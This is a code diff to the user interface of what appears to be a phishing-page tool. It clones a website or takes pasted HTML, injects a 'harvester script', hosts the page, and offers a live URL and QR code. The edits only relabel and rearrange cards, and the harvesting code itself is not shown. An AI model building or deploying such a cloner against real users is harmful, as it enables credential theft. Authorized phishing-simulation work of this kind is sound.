@@ -9,7 +9,7 @@ import { QrCodeGenerator } from '@/components/qr-code-generator';
 import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
-import { Loader2, Clipboard, Globe, Wand, StopCircle, Share2, Save, Trash2, Mail } from 'lucide-react';
+import { Loader2, Clipboard, Globe, Wand, StopCircle, Share2, Save, Trash2 } from 'lucide-react';
 import { useAuth } from '@/hooks/use-auth';
 import { logActivity } from '@/services/activity-log-service';
 import { useForm } from 'react-hook-form';
@@ -339,7 +339,7 @@ export default function PhishingPage() {
         <div className="flex flex-col gap-6">
             <Card>
                 <CardHeader>
-                <CardTitle>Page Cloner & Harvester Setup</CardTitle>
+                <CardTitle>1. Page Cloner</CardTitle>
                 <CardDescription>Clone a page from a URL or paste HTML to inject the harvester script.</CardDescription>
                 </CardHeader>
                 <Form {...form}>
@@ -401,7 +401,7 @@ export default function PhishingPage() {
                     </CardContent>
                     {modifiedHtml && (
                     <CardFooter className="flex-col items-start gap-4">
-                        <CardTitle className="text-xl">Generate & Save</CardTitle>
+                        <CardTitle className="text-xl">2. Generate & Save</CardTitle>
                         <div className="w-full flex gap-2">
                             <Button type="button" onClick={handleGenerateLink} disabled={isProcessing || isHosting} className="w-full">
                                 {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
@@ -436,23 +436,22 @@ export default function PhishingPage() {
             </Card>
           
           {hostedUrl && (
-             <Card>
-               <CardHeader>
-                 <CardTitle>Hosted Page URL</CardTitle>
-                 <CardDescription>Your phishing page is live. Use the URL or QR code below.</CardDescription>
-               </CardHeader>
-               <CardContent className="space-y-4">
-                 <div className="flex w-full items-center gap-2">
-                   <Input readOnly value={hostedUrl} className="font-mono" />
-                   <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
-                     <Clipboard className="h-4 w-4" />
-                   </Button>
-                 </div>
-                 <div className="flex justify-center">
-                   <QrCodeGenerator url={hostedUrl} />
-                 </div>
-               </CardContent>
-             </Card>
+             <div className="grid md:grid-cols-2 gap-4">
+                <Card>
+                    <CardHeader>
+                        <CardTitle>Hosted Page URL</CardTitle>
+                    </CardHeader>
+                    <CardContent>
+                        <div className="flex w-full items-center gap-2">
+                            <Input readOnly value={hostedUrl} className="font-mono" />
+                            <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
+                                <Clipboard className="h-4 w-4" />
+                            </Button>
+                        </div>
+                    </CardContent>
+                </Card>
+                <QrCodeGenerator url={hostedUrl} />
+             </div>
            )}
 
             <Card>
